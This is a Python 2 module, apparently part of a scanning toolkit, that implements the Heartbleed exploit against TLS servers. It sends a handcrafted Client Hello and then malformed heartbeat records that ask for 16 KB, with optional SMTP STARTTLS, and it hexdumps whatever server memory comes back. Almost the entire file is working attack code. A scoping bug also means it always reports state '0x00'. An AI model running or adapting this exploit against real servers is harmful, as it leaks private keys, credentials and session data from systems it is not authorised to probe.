
import sys
import struct
import socket
import time
import select
import re
import smtplib
from C_display import *
#Module
state="0x00"

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hbv10 = h2bin('''
18 03 01 00 03
01 40 00
''')

hbv11 = h2bin('''
18 03 02 00 03
01 40 00
''')

hbv12 = h2bin('''
18 03 03 00 03
01 40 00
''')

def hexdump(s, dumpf, quiet):
	#dump = open(dumpf,'a')
	#dump.write(s)
	#dump.close()
	if quiet: return
	for b in xrange(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % ord(c) for c in lin)
		pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
		zzzzz=1#showDisplay(displayMode,'  %04x: %-48s %s' % (b, hxdat, pdat))
	zzzzz=1#print

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			if not rdata:
				return None
			else:
				return rdata
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			# EOF?
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata

def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		zzzzz=1#showDisplay(displayMode,'Unexpected EOF receiving record header - server closed connection')
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		zzzzz=1#showDisplay(displayMode,'Unexpected EOF receiving record payload - server closed connection')
		return None, None, None
	zzzzz=1#showDisplay(displayMode,' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
	return typ, ver, pay

def hit_hb(s, dumpf, host, quiet):
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			zzzzz=1#showDisplay(displayMode,'No heartbeat response received from '+host+', server likely not vulnerable')
			state = "0x00"
			return False

		if typ == 24:
			if not quiet: zzzzz=1#showDisplay(displayMode,'Received heartbeat response:')
			hexdump(pay, dumpf, quiet)
			if len(pay) > 3:
				zzzzz=1#showDisplay(displayMode,'WARNING: server '+ host +' returned more data than it should - server is vulnerable!')
			else:
				zzzzz=1#showDisplay(displayMode,'Server '+host+' processed malformed heartbeat, but did not return any extra data.')
			state = "0x01"
			return True

		if typ == 21:
			if not quiet: zzzzz=1#showDisplay(displayMode,'Received alert:')
			hexdump(pay, dumpf, quiet)
			zzzzz=1#showDisplay(displayMode,'Server '+ host +' returned error, likely not vulnerable')
			state = "0x00"
			return False

def connect(host, port, quiet):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if not quiet: zzzzz=1#showDisplay(displayMode,'Connecting...')
	sys.stdout.flush()
	s.connect((host, port))
	return s

def tls(s, quiet,displayMode):
	if not quiet: showDisplay(displayMode,' - [LOG] Sending Client Hello...')
	sys.stdout.flush()
	s.send(hello)
	if not quiet: showDisplay(displayMode,' - [LOG] Waiting for Server Hello...')
	sys.stdout.flush()

def parseresp(s):
	while True:
		typ, ver, pay = recvmsg(s)
		if typ == None:
			zzzzz=1#showDisplay(displayMode,'Server closed connection without sending Server Hello.')
			return 0
		# Look for server hello done message.
		if typ == 22 and ord(pay[0]) == 0x0E:
			return ver

def check(host, port, dumpf, quiet, starttls,displayMode):
	response = False
	if starttls:
		try:
			s = smtplib.SMTP(host=host,port=port)
			s.ehlo()
			s.starttls()
		except smtplib.SMTPException:
			zzzzz=1#showDisplay(displayMode,'STARTTLS not supported...')
			s.quit()
			return False
		zzzzz=1#showDisplay(displayMode,'STARTTLS supported...')
		s.quit()
		s = connect(host, port, quiet)
		s.settimeout(1)
		try:
			re = s.recv(1024)
			s.send('ehlo starttlstest\r\n')
			re = s.recv(1024)
			s.send('starttls\r\n')
			re = s.recv(1024)
		except socket.timeout:
			zzzzz=1#showDisplay(displayMode,'Timeout issues, going ahead anyway, but it is probably broken ...')
		tls(s,quiet,displayMode)
	else:
		s = connect(host, port, quiet)
		tls(s,quiet,displayMode)

	version = parseresp(s)

	if version == 0:
		if not quiet: zzzzz=1#showDisplay(displayMode,"Got an error while parsing the response, bailing ...")
		return False
	else:
		version = version - 0x0300
		if not quiet: zzzzz=1#showDisplay(displayMode,"Server TLS version was 1.%d\n" % version)

	if not quiet: showDisplay(displayMode,' - [LOG] Sending heartbeat request..')
	sys.stdout.flush()
	if (version == 1):
		s.send(hbv10)
		response = hit_hb(s,dumpf, host, quiet)
	if (version == 2):
		s.send(hbv11)
		response = hit_hb(s,dumpf, host, quiet)
	if (version == 3):
		s.send(hbv12)
		response = hit_hb(s,dumpf, host, quiet)
	s.close()
	return response

def m_heartbleed_run(target,port,displayMode):
	check(target,port,"","","",displayMode)
	return state
#	for i in xrange(0,opts.num):
#		check(target, port,"", "", "")

